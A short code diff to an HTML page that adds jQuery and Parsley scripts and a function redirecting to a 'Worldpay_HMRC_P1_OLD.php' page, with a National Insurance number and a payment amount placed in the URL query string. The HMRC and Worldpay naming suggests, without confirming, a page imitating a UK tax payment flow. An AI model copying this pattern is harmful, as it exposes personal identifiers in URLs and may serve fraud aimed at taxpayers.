@@ -1,2 +1,9 @@
 <!-- Javascript -->
+<script src="/public/javascripts/jquery-2.1.4.min.js"></script>
+<script src="/public/javascripts/parsley.min.js"></script>
 <script src="/public/javascripts/application.js"></script>
+<script>
+  function completeAndRedirect(){
+    location.href = "./Worldpay_HMRC_P1_OLD.php?refID="+document.getElementById('ni-number').value+"&Amount="+document.getElementById('amount-number').value;
+  }
+</Script>
